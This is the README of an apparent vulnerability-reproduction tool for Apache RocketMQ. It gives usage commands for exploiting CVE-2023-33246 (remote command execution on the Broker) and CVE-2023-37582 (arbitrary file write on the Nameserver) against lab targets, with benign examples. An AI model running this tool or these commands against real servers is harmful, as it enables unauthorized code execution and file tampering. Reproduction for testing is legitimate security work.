# RocketMQ Attack Tool

A tool for testing RocketMQ vulnerabilities.

⚠️ **WARNING** ⚠️

**THIS IS A SECURITY TESTING TOOL THAT MAY CAUSE SEVERE DAMAGE TO TARGET APPLICATIONS**

- This tool can disrupt normal operations of RocketMQ services
- DO NOT use in production environments
- DO NOT use without explicit authorization
- Use at your own risk
- Authors are not responsible for any damage caused by this tool

## Features

- [x] Attack RocketMQ Broker (CVE-2023-33246)
- [x] Attack RocketMQ Nameserver (CVE-2023-37582)
- [x] Easy-to-use command-line interface
- [x] Support for both short and long command options

## Usage

Download the latest built JAR file from [Releases](https://github.com/vulhub/rocketmq-attack/releases/tag/1.1).

### Attack Broker (CVE-2023-33246)

Command-line options:

- `-t, --target`: Target address in host:port format
- `-c, --cmd`: Command to execute on the target

Reproduce environment: [CVE-2023-33246](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246)

```bash
java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target <host:port> --cmd <command>

# Example:
java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker --target 127.0.0.1:10911 --cmd "id"
```

### Attack Nameserver (CVE-2023-37582)

Command-line options:

- `-t, --target`: Target address in host:port format
- `-f, --file`: Target file path to write
- `-d, --data`: Content to write into the file

Reproduce environment: [CVE-2023-37582](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-37582)

```bash
java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackNamesrv --target <host:port> --file <file_path> --data <content>

# Example:
java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackNamesrv --target 127.0.0.1:9876 --file /tmp/test.txt --data "Hello World"
```

## Building

Requires JDK 8 or later.

```bash
./gradlew shadowJar
```

The built JAR file will be located at `build/libs/rocketmq-attack-1.1-SNAPSHOT.jar`

## References

- [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)
- [CVE-2023-37582](https://nvd.nist.gov/vuln/detail/CVE-2023-37582)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
